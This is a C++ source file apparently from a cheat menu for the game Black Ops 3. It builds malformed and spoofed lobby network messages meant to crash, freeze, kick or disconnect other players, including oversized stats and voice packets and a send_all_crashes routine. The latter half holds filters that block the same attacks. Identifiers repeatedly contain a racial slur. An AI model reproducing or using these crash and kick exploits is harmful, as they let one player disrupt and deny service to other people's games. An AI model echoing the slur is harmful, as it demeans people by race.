//=====================================================================================

#include "../../StdAfx.hpp"

//=====================================================================================

//mostly all the exploits I added were from other menus
//I added them bc IUF didn't






namespace t7
{
	exploits_c exploits;

	void exploits_c::package_invalid_statsbuffer(structures::LobbyMsg* lobby_msg)
	{
		structures::Msg_ModifiedStats modified_stats;
		std::string stats_buffer(65536, 'a');

		modified_stats.statsSize = std::numeric_limits<std::int32_t>::max();

		functions::LobbyMsgRW_PackageInt(lobby_msg, "statssize", &modified_stats.statsSize);
		functions::LobbyMsgRW_PackageGlob(lobby_msg, "statsbuffer", stats_buffer.data(), stats_buffer.length());
	}
	/*
	//=====================================================================================
	*/

	

	void exploits_c::package_invalid_voicedata(structures::LobbyMsg* lobby_msg)
	{
		structures::Msg_VoicePacket voice_packet;
		std::string voice_data(1198, 'a');

		voice_packet.lobbyType = structures::LOBBY_TYPE_PRIVATE;
		voice_packet.talkerIndex = 0;
		voice_packet.relayBits = 0;
		voice_packet.sizeofVoiceData = std::numeric_limits<std::uint16_t>::max();
		voice_packet.numPacketsInData = std::numeric_limits<std::uint8_t>::max();

		functions::LobbyMsgRW_PackageInt(lobby_msg, "lobbytype", std::recast<std::int32_t*>(&voice_packet.lobbyType));
		functions::LobbyMsgRW_PackageUChar(lobby_msg, "talker", &voice_packet.talkerIndex);
		functions::LobbyMsgRW_PackageInt(lobby_msg, "relaybits", &voice_packet.relayBits);
		functions::LobbyMsgRW_PackageUShort(lobby_msg, "sizeofvoicedata", &voice_packet.sizeofVoiceData);
		functions::LobbyMsgRW_PackageUChar(lobby_msg, "numpackets", &voice_packet.numPacketsInData);
		functions::LobbyMsgRW_PackageGlob(lobby_msg, "voicedata", voice_data.data(), voice_data.length());
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_modified_stats_crash(const std::int32_t clientnum)
	{
		send_modified_stats_crash(functions::get_client_xuid(clientnum), functions::get_client_netadr(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_modified_stats_crash(const std::uint64_t recipient, const structures::netadr_t& to)
	{
		structures::LobbyMsg lobby_msg{};
		structures::max_lobby_msg_buf msg_buffer = { 0 };

		functions::LobbyMsgRW_PrepWriteMsg(&lobby_msg, msg_buffer, sizeof(msg_buffer), structures::MESSAGE_TYPE_LOBBY_MODIFIED_STATS);

		package_invalid_statsbuffer(&lobby_msg);

		functions::LobbyMsgTransport_SendOutOfBand(structures::CONTROLLER_INDEX_FIRST, recipient, to, &lobby_msg.msg, lobby_msg.msgType);
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_voice_packet_crash(const std::int32_t clientnum)
	{
		send_voice_packet_crash(functions::get_client_xuid(clientnum), functions::get_client_netadr(clientnum));
	}
	/*
	* 
	* 
 
	
	* 
	//=====================================================================================
	*/
	
	


	
	
	
	
	


	

	t7::structures::LobbyType get_lobby_type()
	{
		if (t7::functions::LobbySession_GetControllingLobbySession(t7::structures::LobbyModule::LOBBY_MODULE_CLIENT))
		{
			return t7::structures::LobbyType::LOBBY_TYPE_GAME;
		}

		else
		{
			return t7::structures::LobbyType::LOBBY_TYPE_PRIVATE;
		}
	}



	
	void exploits_c::SendNOPARTYCHAT3(uint64_t XUID, const t7::structures::netadr_t& to)// Something in wanteds menu (I decided to add it bc iuf didn't)
	{

		char lobbyMsgOOB[0x20000]{};
		t7::structures::LobbyMsg lm{};
		t7::functions::LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), t7::structures::MsgType::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

		__int64 zeroField = 0;
		__int64 nopartychat = 7;
		uint32_t datamask4 = 4;

		t7::functions::LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
		t7::functions::LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
		t7::functions::LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&XUID);
		t7::functions::LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&nopartychat);

		//spoofedXUID = XUID;
		//SetXUIDSpoofed(true);
		t7::functions::LobbyMsgTransport_SendToAdr(structures::CONTROLLER_INDEX_FIRST, structures::NETCHAN_LOBBYPRIVATE_RELIABLE, structures::LobbyModule::LOBBY_MODULE_HOST, to, XUID, (t7::structures::msg_t*)&lm, t7::structures::MsgType::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
		//SetXUIDSpoofed(false);
	}





	void exploits_c::send_voice_packet_crash(const std::uint64_t recipient, const structures::netadr_t& to)
	{
		structures::LobbyMsg lobby_msg{};
		structures::max_lobby_msg_buf msg_buffer = { 0 };

		functions::LobbyMsgRW_PrepWriteMsg(&lobby_msg, msg_buffer, sizeof(msg_buffer), structures::MESSAGE_TYPE_VOICE_PACKET);

		package_invalid_voicedata(&lobby_msg);

		functions::LobbyMsgTransport_SendOutOfBand(structures::CONTROLLER_INDEX_FIRST, recipient, to, &lobby_msg.msg, lobby_msg.msgType);
	}
	/*
	//=====================================================================================
	*/
	//zm ui error
	
	void exploits_c::SendZM_UI_ERROR(const std::uint64_t recipient, const structures::netadr_t& to) //some cool UI error that I pasted from wnted menu 
	{

		char lobbyMsgOOB[0x20000]{};
		t7::structures::LobbyMsg lm{};
		t7::functions::LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), t7::structures::MsgType::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

		__int64 oneField = 1;
		uint32_t datamask = 512;
		uint32_t characterSelection = 40;
		uint32_t loadoutType = 100;

		t7::functions::LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask);
		t7::functions::LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&oneField);
		t7::functions::LobbyMsgRW_PackageUInt(&lm, "character", (unsigned int*)&characterSelection);
		t7::functions::LobbyMsgRW_PackageUInt(&lm, "loadout", (unsigned int*)&loadoutType);



		t7::functions::LobbyMsgTransport_SendToAdr(structures::CONTROLLER_INDEX_FIRST, structures::NETCHAN_LOBBYPRIVATE_RELIABLE, structures::LobbyModule::LOBBY_MODULE_HOST, to, recipient, (t7::structures::msg_t*)&lm, structures::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	}
	
	//zombies blue screen



void exploits_c::SendBADDLC(const std::uint64_t recipient, const t7::structures::netadr_t& to)// zm blue screen
	{

		char lobbyMsgOOB[0x20000]{};
		t7::structures::LobbyMsg lm{};
	t7::functions::LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), t7::structures::MsgType::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);

		__int64 zeroField = 0;
		__int64 baddlc = 2;
		uint32_t datamask4 = 4;

		t7::functions::LobbyMsgRW_PackageUInt(&lm, "datamask", (unsigned int*)&datamask4);
		t7::functions::LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&zeroField);
		t7::functions::LobbyMsgRW_PackageXuid(&lm, "discclientxuid", (uint64_t*)&recipient);
		t7::functions::LobbyMsgRW_PackageInt(&lm, "discclient", (__int32*)&baddlc);

		
		t7::functions::LobbyMsgTransport_SendToAdr(structures::CONTROLLER_INDEX_FIRST, structures::NETCHAN_LOBBYPRIVATE_RELIABLE, structures::LobbyModule::LOBBY_MODULE_HOST, to, recipient, (t7::structures::msg_t*)&lm, t7::structures::MsgType::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
	}


	
	//server disconnect
	void exploits_c::Send_Client_Disconnect(const t7::structures::netadr_t& hostadr, uint64_t hostxuid, uint64_t victimxuid) //some leak server kick
	{
		char lobbyMsgOOB[0x20000]{};
		t7::structures::LobbyMsg lm{};
		t7::functions::LobbyMsgRW_PrepWriteMsg(&lm, lobbyMsgOOB, sizeof(lobbyMsgOOB), t7::structures::MsgType::MESSAGE_TYPE_LOBBY_CLIENT_DISCONNECT);

		auto lobbytype = get_lobby_type();

		t7::functions::LobbyMsgRW_PackageInt(&lm, "lobbytype", (__int32*)&lobbytype);
		t7::functions::LobbyMsgRW_PackageXuid(&lm, "xuid", &victimxuid);

		t7::functions::LobbyMsgTransport_SendToAdr(structures::CONTROLLER_INDEX_FIRST, structures::NETCHAN_LOBBYPRIVATE_RELIABLE, structures::LobbyModule::LOBBY_MODULE_HOST, hostadr, hostxuid, (t7::structures::msg_t*)&lm, t7::structures::MsgType::MESSAGE_TYPE_LOBBY_CLIENT_DISCONNECT);


	}
	



	void exploits_c::send_lsgame_crash(const t7::structures::netadr_t to, __int64 xuid)// some useless package for a package element crash - wanted
	{

		char lobbyMsgOOB[0x20000]{};
		t7::structures::Msg_LobbyStateGame lobbyStateGame;

		t7::structures::LobbyMsg lm{};
		memset(lobbyMsgOOB, 0, sizeof(lobbyMsgOOB));
		memset(&lm, 0, sizeof(&lm));

		t7::functions::LobbyMsgRW_PrepWriteMsg(&lm, (char*)lobbyMsgOOB, sizeof(lobbyMsgOOB), t7::structures::MsgType::MESSAGE_TYPE_LOBBY_STATE_GAME);

		t7::functions::LobbyMsgRW_PackageArrayStart(&lm, "clientlist");
		t7::functions::LobbyMsgRW_PackageUInt(&lm, "votecount", (uint32_t*)&lobbyStateGame.core);
		t7::functions::LobbyMsgRW_PackageArrayStart(&lm, "votes");


		t7::functions::LobbyMsgTransport_SendToAdr(structures::CONTROLLER_INDEX_FIRST, structures::NETCHAN_LOBBYPRIVATE_RELIABLE, structures::LobbyModule::LOBBY_MODULE_HOST, to, xuid, (t7::structures::msg_t*)&lm, t7::structures::MsgType::MESSAGE_TYPE_LOBBY_STATE_GAME);

	}




	void exploits_c::send_voice_relay_packet_crash(const std::int32_t clientnum)
	{
		send_voice_relay_packet_crash(functions::get_client_xuid(clientnum), functions::get_client_netadr(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_voice_relay_packet_crash(const std::uint64_t recipient, const structures::netadr_t& to)
	{
		structures::LobbyMsg lobby_msg{};
		structures::max_lobby_msg_buf msg_buffer = { 0 };

		functions::LobbyMsgRW_PrepWriteMsg(&lobby_msg, msg_buffer, sizeof(msg_buffer), structures::MESSAGE_TYPE_VOICE_RELAY_PACKET);

		package_invalid_voicedata(&lobby_msg);

		functions::LobbyMsgTransport_SendOutOfBand(structures::CONTROLLER_INDEX_FIRST, recipient, to, &lobby_msg.msg, lobby_msg.msgType);
	}




	/*
	//=====================================================================================
	*/
	void exploits_c::send_instant_crash(const std::int32_t clientnum)
	{
		send_instant_crash(std::vector<std::uint64_t>{ functions::get_client_xuid(clientnum) });
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_instant_crash(const std::vector<std::uint64_t>& recipients)
	{
		if (!functions::Live_IsUserSignedInToDemonware(structures::CONTROLLER_INDEX_FIRST))
			return;

		if (!recipients.empty())
		{
			structures::JoinSessionMessage message{ structures::JOIN_REQUEST };
			functions::dwInstantSendMessage(structures::CONTROLLER_INDEX_FIRST, recipients.data(), recipients.size(), 'f', &message, sizeof(message));
		}
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_instant_popup(const std::int32_t clientnum)
	{
		send_instant_popup(std::vector<std::uint64_t>{ functions::get_client_xuid(clientnum) });
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_instant_popup(const std::vector<std::uint64_t>& recipients)
	{
		if (!functions::Live_IsUserSignedInToDemonware(structures::CONTROLLER_INDEX_FIRST))
			return;

		if (!recipients.empty())
		{
			structures::JoinSessionMessage message{ structures::JOIN_REPLY };
			functions::dwInstantSendMessage(structures::CONTROLLER_INDEX_FIRST, recipients.data(), recipients.size(), 'f', &message, 0);
		}
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_relay_crash(const std::int32_t clientnum)
	{
		send_relay_crash(functions::get_client_netadr(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_relay_crash(const structures::netadr_t& to)
	{
		send_oob_data(to, relay_packet);
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_vt_crash(const std::int32_t clientnum)
	{
		send_vt_crash(functions::get_client_netadr(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_vt_crash(const structures::netadr_t& to)
	{
		send_oob_data(to, vt_packet);
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_all_crashes(const std::int32_t clientnum)
	{
		send_all_crashes(functions::get_client_xuid(clientnum), functions::get_client_netadr(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_all_crashes(const std::uint64_t recipient, const structures::netadr_t& to)
	{
		send_relay_crash(to);
		send_vt_crash(to);
		

		send_modified_stats_crash(recipient, to);
		send_voice_packet_crash(recipient, to);
		send_voice_relay_packet_crash(recipient, to);
	}
	/*
	//=====================================================================================
	*/
	
	
	
	void exploits_c::send_migration_screen(const std::int32_t clientnum)
	{
		send_migration_screen(functions::get_client_netadr(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_migration_screen(const structures::netadr_t& to)
	{
		send_oob_data(to, mstart_packet);
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_immobilization_screen(const std::int32_t clientnum)
	{
		send_immobilization_screen(functions::get_client_netadr(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_immobilization_screen(const structures::netadr_t& to)
	{
		send_oob_data(to, requeststats_packet);
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_migration_kick(const std::int32_t clientnum)
	{
		send_migration_kick(functions::get_client_netadr(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_migration_kick(const structures::netadr_t& to)
	{
		send_oob_data(to, connectresponsemigration_packet);
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_disconnect_kick(const std::int32_t clientnum)
	{
		send_disconnect_kick(functions::get_client_xuid(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_disconnect_kick(const std::uint64_t recipient)
	{
		if (!functions::Live_IsUserSignedInToDemonware(structures::CONTROLLER_INDEX_FIRST))
			return;

		functions::LobbyClientMsg_SendDisconnectClient(structures::CONTROLLER_INDEX_FIRST, functions::get_current_lobby_type(), recipient, structures::LOBBY_DISCONNECT_CLIENT_DROP);
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_all_kicks(const std::int32_t clientnum)
	{
		send_all_kicks(functions::get_client_xuid(clientnum), functions::get_client_netadr(clientnum));
	}
	/*
	//=====================================================================================
	*/
	void exploits_c::send_all_kicks(const std::uint64_t recipient, const structures::netadr_t& to)
	{
		send_migration_kick(to);
		send_disconnect_kick(recipient);
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::send_oob_data(const structures::netadr_t& to, const std::string& data, const structures::netsrc_t sock)
	{
		return functions::NET_OutOfBandPrint(sock, to, data.c_str());
	}





	/*
	//=====================================================================================
	*/
	void exploits_c::log_server_command()
	{
		if (auto cmd_args{ functions::get_cmd_args() }; cmd_args)
		{
			auto args = niggerware::utils::string::pointer_array_to_vector(cmd_args->get_args(), cmd_args->get_arg_count());

			logger::instance().add_entry("Server CMD: %s", niggerware::utils::string::concatenate(args, ' ').c_str());
		}
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::log_connectionless_packet(const structures::netadr_t& from, structures::msg_t* msg)
	{
		auto should_ignore = false;

		if (auto shitter{ shitters.get_if_present({ functions::get_client_xuid(&from) }) }; shitter != shitters.shit_list.end() && shitter->flags & shitters_c::action_flag_block_incoming)
			return true;

		auto sender_id = ""s;

		if (auto client_num{ functions::get_client_num(&from) }; client_num > -1)
			sender_id = functions::get_client_identity(client_num);

		else if (functions::NetAdr_Compare(&from, &structures::get_client_connection(structures::LOCAL_CLIENT_FIRST)->serverAddress))
			sender_id = functions::get_client_identity("serverAddress", &structures::get_client_connection(structures::LOCAL_CLIENT_FIRST)->serverAddress);

		else if (functions::NetAdr_Compare(&from, &structures::get_client_connection(structures::LOCAL_CLIENT_FIRST)->remoteAddress))
			sender_id = functions::get_client_identity("remoteAddress", &structures::get_client_connection(structures::LOCAL_CLIENT_FIRST)->remoteAddress);

		else
			sender_id = functions::get_ip_address(&from).to_string();

		if (auto cmd_args{ functions::get_cmd_args() }; cmd_args)
		{
			auto args = niggerware::utils::string::pointer_array_to_vector(cmd_args->get_args(), cmd_args->get_arg_count());

			logger::instance().add_entry("OOB Data: [ip:%s]->'%s'", functions::get_ip_address(&from).to_string().c_str(), args[0].c_str());

			if (niggerware::utils::string::is_equal(args[0], loadingnewmap_packet, false))
			{
				RCE::AddToLog("(PRIVATE) Map Load Crash Fixed");

				should_ignore = true;
			}

			else if (niggerware::utils::string::is_equal(args[0], relay_packet, false))
			{
				RCE::AddToLog("Relay Crash Fixed");

				should_ignore = true;
			}

			if (args.empty())
			{
				return true;
			}
			else if (niggerware::utils::string::is_equal(args[0], vt_packet, false))
			{
				RCE::AddToLog("Voice Test Crash Fixed");

				should_ignore = true;
			}

			else if (niggerware::utils::string::is_equal(args[0], mstart_packet, false))
			{
				RCE::AddToLog("Migration Screen Fixed");
				should_ignore = true;
			}

			else if (niggerware::utils::string::is_equal(args[0], requeststats_packet, false))
			{
				RCE::AddToLog("Freeze Screen Fixed");

				should_ignore = true;
			}

			else if (niggerware::utils::string::is_equal(args[0], connectresponsemigration_packet, false))
			{
				RCE::AddToLog("HostDisconnect Kick Fixed");

				should_ignore = true;
			}
		}

		return should_ignore;
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::log_instant_message(const char* message, const std::uint32_t message_size, const std::uint64_t from)
	{
		auto should_ignore = false;
		structures::msg_t msg{};

		functions::MSG_InitReadOnly(&msg, message, message_size);
		functions::MSG_BeginReading(&msg);

		auto type = '\0';

		if (functions::MSG_ReadByte(&msg) == '1')
			type = functions::MSG_ReadByte(&msg);

		auto sender_id = ""s;

		if (auto client_num{ functions::get_client_num(from) }; client_num > -1)
			sender_id = functions::get_client_identity(client_num);

		else if (auto shitter{ shitters.get_if_present({ from }) }; shitter != shitters.shit_list.end())
			sender_id = functions::get_client_identity(shitter->name, shitter->xuid);

		else
			sender_id = functions::get_client_identity(from);

		logger::instance().add_entry("Instant MSG: [id:%llu]->'%s' (len: %u)", from, message, message_size);

		if (type == 'e')
		{
			should_ignore = true;

			RCE::AddToLog("Remote RCE Fixed");
		}

		else if (type == 'f')
		{
			should_ignore = true;

			RCE::AddToLog("DWInstantMSG Fixed");
		}

		else if (type == 'h')
		{
			if (const auto size{ msg.cursize - msg.readcount }; size < 2048u)
			{
				char data[2048] = { 0 };
				functions::MSG_ReadData(&msg, data, size);

				if (!msg.overflowed)
				{
					structures::LobbyMsg lobby_msg{};

					if (!functions::LobbyMsgRW_PrepReadData(&lobby_msg, data, size))
						return should_ignore;

					if (auto shitter{ shitters.get_if_present({ from }) }; shitter != shitters.shit_list.end() && shitter->flags & shitters_c::action_flag_block_incoming)
					{
						if (lobby_msg.msgType == structures::MESSAGE_TYPE_INFO_REQUEST)
						{
							RCE::AddToLog("Info Request Fixed");

							should_ignore = true;
						}

						else if (lobby_msg.msgType == structures::MESSAGE_TYPE_INFO_RESPONSE)
						{
							RCE::AddToLog("Info Request Responce Fixed");

							should_ignore = true;
						}
					}

					else
					{
						if (lobby_msg.msgType == structures::MESSAGE_TYPE_INFO_REQUEST)
						{
							RCE::AddToLog("Info Request Fixed");


						}

						else if (lobby_msg.msgType == structures::MESSAGE_TYPE_INFO_RESPONSE)
						{

							structures::Msg_InfoResponse response{};

							if (!functions::Msg_InfoResponse(&response, &lobby_msg))
								return should_ignore;

							shitters.get_info_response(response.lobby[0]);
						}
					}
				}
			}
		}

		else
		{
			if (auto shitter{ shitters.get_if_present({ from }) }; shitter != shitters.shit_list.end() && shitter->flags & shitters_c::action_flag_block_incoming)
			{
				should_ignore = true;
			}
		}

		return should_ignore;
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::log_package_element(structures::LobbyMsg* lobby_msg, const structures::LobbyMsgElementType type)
	{
		logger::instance().add_entry("Package Elem: '%s'", functions::LobbyTypes_GetMsgTypeName(lobby_msg->msgType));

		return (type != structures::MESSAGE_ELEMENT_ARRAY_BEGIN && type != structures::MESSAGE_ELEMENT_ARRAY_ELEMENT);
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::inspect_host_disconnect(structures::LobbyMsg* lobby_msg)
		
	{
		
		RCE::AddToLog("Host Disconnect Patched");
		return false;
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::inspect_lobby_state(structures::LobbyMsg* lobby_msg)
	{
		structures::Msg_LobbyStateGame lobby_state{};

		if (!functions::Msg_LobbyState(&lobby_state.core, lobby_msg))
			return false;

		if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "serverstatus", std::recast<std::int32_t*>(&lobby_state.dataGame.serverStatus)))
			return false;

		if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "launchnonce", &lobby_state.dataGame.launchNonce))
			return false;

		if (!functions::LobbyMsgRW_PackageUInt64(lobby_msg, "matchhashlow", &lobby_state.dataGame.matchHash.lower))
			return false;

		if (!functions::LobbyMsgRW_PackageUInt64(lobby_msg, "matchhashhigh", &lobby_state.dataGame.matchHash.upper))
			return false;

		if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "status", &lobby_state.dataGame.status))
			return false;

		if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "statusvalue", &lobby_state.dataGame.statusValue))
			return false;

		if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "gamemode", std::recast<std::int32_t*>(&lobby_state.dataGame.gameMode)))
			return false;

		if (!functions::LobbyMsgRW_PackageString(lobby_msg, "gametype", lobby_state.dataGame.gameType, 32))
			return false;

		if (!functions::LobbyMsgRW_PackageString(lobby_msg, "map", lobby_state.dataGame.mapName, 32))
			return false;

		if (!functions::LobbyMsgRW_PackageString(lobby_msg, "ugcName", lobby_state.dataGame.ugcName, 32))
			return false;

		if (!functions::LobbyMsgRW_PackageUInt(lobby_msg, "ugcVersion", &lobby_state.dataGame.ugcVersion))
			return false;

		if (lobby_state.core.lobbyMainMode == structures::LOBBY_MAINMODE_CP)
		{
			if (!functions::LobbyMsgRW_PackageString(lobby_msg, "cpqueuedlevel", lobby_state.dataGame.cpQueuedLevel, 32))
				return false;

			if (!functions::LobbyMsgRW_PackageBool(lobby_msg, "movieskipped", &lobby_state.dataGame.loadingMovieSkipped))
				return false;
		}

		if (lobby_state.core.lobbyMode == structures::LOBBY_MODE_CUSTOM)
		{
			if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "votecount", std::recast<std::int32_t*>(&lobby_state.dataGame.pregameVoteCount)))
				return false;

			if (lobby_state.dataGame.pregameVoteCount > 216u)
				return false;

			functions::LobbyMsgRW_PackageArrayStart(lobby_msg, "votes");

			for (auto i{ 0 }; functions::LobbyMsgRW_PackageElement(lobby_msg, i < lobby_state.dataGame.pregameVoteCount); i++)
			{
				auto vote = &lobby_state.dataGame.pregameVotes[i];

				if (!functions::LobbyMsgRW_PackageShort(lobby_msg, "itemtype", std::recast<std::int16_t*>(&vote->itemType)))
					return false;

				if (!functions::LobbyMsgRW_PackageUInt(lobby_msg, "item", &vote->itemIndex))
					return false;

				if (!functions::LobbyMsgRW_PackageShort(lobby_msg, "itemgroup", std::recast<std::int16_t*>(&vote->itemGroup)))
					return false;

				if (!functions::LobbyMsgRW_PackageShort(lobby_msg, "attachment", std::recast<std::int16_t*>(&vote->attachment)))
					return false;

				if (!functions::LobbyMsgRW_PackageShort(lobby_msg, "votetype", std::recast<std::int16_t*>(&vote->voteType)))
					return false;

				if (!functions::LobbyMsgRW_PackageXuid(lobby_msg, "votexuid", &vote->clientXuid))
					return false;
			}

			functions::LobbyMsgRW_PackageArrayStart(lobby_msg, "clientlist");

			for (auto i{ 0 }; functions::LobbyMsgRW_PackageElement(lobby_msg, i < max_clients); i++)
			{
				auto client = &lobby_state.dataGame.client[i];

				if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "team", std::recast<std::int32_t*>(&client->team)))
					return false;

				if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "pregamepos", &client->pregamePosition))
					return false;

				if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "pregamestate", std::recast<std::int32_t*>(&client->pregameState)))
					return false;

				if (!functions::LobbyMsgRW_PackageUInt(lobby_msg, "clvotecount", &client->itemVoteCount))
					return false;

				if (!functions::LobbyMsgRW_PackageUInt(lobby_msg, "character", &client->characterSelection.characterIndex))
					return false;

				if (!functions::LobbyMsgRW_PackageUInt(lobby_msg, "loadout", std::recast<std::uint32_t*>(&client->characterSelection.loadoutType)))
					return false;
			}

			if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "settingssize", &lobby_state.compressedBufferSize))
				return false;

			if (lobby_state.compressedBufferSize > 0xC000)
				return false;
		}

		return true;
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::inspect_modified_stats(structures::LobbyMsg* lobby_msg)
	{
		structures::Msg_ModifiedStats modified_stats;

		if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "statssize", &modified_stats.statsSize))
			return false;

		if (modified_stats.statsSize > 0x10000)
			return false;

		return true;
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::inspect_join_handshake(structures::LobbyMsg* lobby_msg)
	{
		return true;
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::inspect_voice_packet(structures::LobbyMsg* lobby_msg)
	{
		structures::Msg_VoicePacket voice_packet;

		if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "lobbytype", std::recast<std::int32_t*>(&voice_packet.lobbyType)))
			return false;

		if (!functions::LobbyMsgRW_PackageUChar(lobby_msg, "talker", &voice_packet.talkerIndex))
			return false;

		if (!functions::LobbyMsgRW_PackageInt(lobby_msg, "relaybits", &voice_packet.relayBits))
			return false;

		if (!functions::LobbyMsgRW_PackageUShort(lobby_msg, "sizeofvoicedata", &voice_packet.sizeofVoiceData))
			return false;

		if (!functions::LobbyMsgRW_PackageUChar(lobby_msg, "numpackets", &voice_packet.numPacketsInData))
			return false;

		if (voice_packet.sizeofVoiceData > 1198u)
			return false;

		if (!functions::LobbyMsgRW_PackageGlob(lobby_msg, "voicedata", voice_packet.voiceData, voice_packet.sizeofVoiceData))
			return false;

		if (voice_packet.numPacketsInData)
		{
			auto bytes_read = 0;
			for (auto i{ 0 }; i < voice_packet.numPacketsInData; i++)
			{
				auto size = voice_packet.voiceData[bytes_read];
				bytes_read += size;

				if (bytes_read >= 1198u)
				{
					return false;
				}
			}
		}

		return true;
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::should_ignore_msg
	(
		const structures::netadr_t& from_adr,
		const std::uint64_t from_xuid,
		const structures::LobbyModule lobby_module,
		const structures::LobbyType lobby_type,
		structures::LobbyMsg* lobby_msg
	)
	{
		auto should_ignore = false;

		msg_begin_read(lobby_msg->msg);

		switch (lobby_msg->msgType)
		{
		
		
		//private lobbymsg Crashes Patched By Gamer9882

		case structures::MESSAGE_TYPE_INGAME_MIGRATE_NEW_HOST:
		
		
		case structures::MESSAGE_TYPE_INFO_REQUEST:
		{
			RCE::AddToLog("Info Request Detected");


		}
		case structures::MESSAGE_TYPE_INFO_RESPONSE:
		
		case structures::MESSAGE_TYPE_COUNT:
		


		case structures::MESSAGE_TYPE_LOBBY_STATE_GAMEPUBLIC:
		{
			RCE::AddToLog(" GAMEPUBLIC Private Crash Fixed");
		} break;


		case structures::MESSAGE_TYPE_LOBBY_STATE_GAMECUSTOM:
		{
			RCE::AddToLog("GAME CUSTOM Private Crash Fixed");
		} break;
		
		case structures::MESSAGE_TYPE_LOBBY_STATE_GAMETHEATER:
		{
			RCE::AddToLog(" GAMER THEATRE Private Crash Fixed");
		} break;


		case structures::MESSAGE_TYPE_LOBBY_MIGRATE_ANNOUNCE_HOST:
		{
			RCE::AddToLog(" ANNOUNCE_HOST Private Crash Fixed");
		} break;
		
		case structures::MESSAGE_TYPE_SERVERLIST_INFO:
		{
			RCE::AddToLog("SERVERLIST_INFO Private Crash Fixed");
		} break;




		
		
		//normal nb0t patches
		case structures::MESSAGE_TYPE_LOBBY_HOST_DISCONNECT_CLIENT:
		{
			if (!inspect_host_disconnect(lobby_msg))
				should_ignore = true;
		} break;

		case structures::MESSAGE_TYPE_LOBBY_STATE_GAME:
		{
			if (!inspect_lobby_state(lobby_msg))
				should_ignore = true;
		} break;

		case structures::MESSAGE_TYPE_LOBBY_MODIFIED_STATS:
		{
			if (!inspect_modified_stats(lobby_msg))
				should_ignore = true;
		} break;

		case structures::MESSAGE_TYPE_JOIN_AGREEMENT_REQUEST:
		case structures::MESSAGE_TYPE_JOIN_COMPLETE:
		{
			if (!inspect_join_handshake(lobby_msg))
				should_ignore = true;
		} break;

		case structures::MESSAGE_TYPE_VOICE_PACKET:
		case structures::MESSAGE_TYPE_VOICE_RELAY_PACKET:
		{
			if (!inspect_voice_packet(lobby_msg))
				should_ignore = true;
		} break;
		}

		msg_end_read(lobby_msg->msg);

		return should_ignore;
	}
	/*
	//=====================================================================================
	*/
	bool exploits_c::log_packet_internal
	(
		const structures::netadr_t& from_adr,
		const std::uint64_t from_xuid,
		const structures::LobbyModule lobby_module,
		const structures::LobbyType lobby_type,
		structures::LobbyMsg* lobby_msg
	)
	{
		auto sender_id = ""s;

		if (auto client_num{ functions::get_client_num(&from_adr) }; client_num > -1)
			sender_id = functions::get_client_identity(client_num);

		else if (auto client_num{ functions::get_client_num(from_xuid) }; client_num > -1)
			sender_id = functions::get_client_identity(client_num);

		else if (auto shitter{ shitters.get_if_present({ from_xuid }) }; shitter != shitters.shit_list.end())
			sender_id = functions::get_client_identity(shitter->name, shitter->xuid);

		else
			sender_id = functions::get_client_identity(&from_adr, from_xuid);

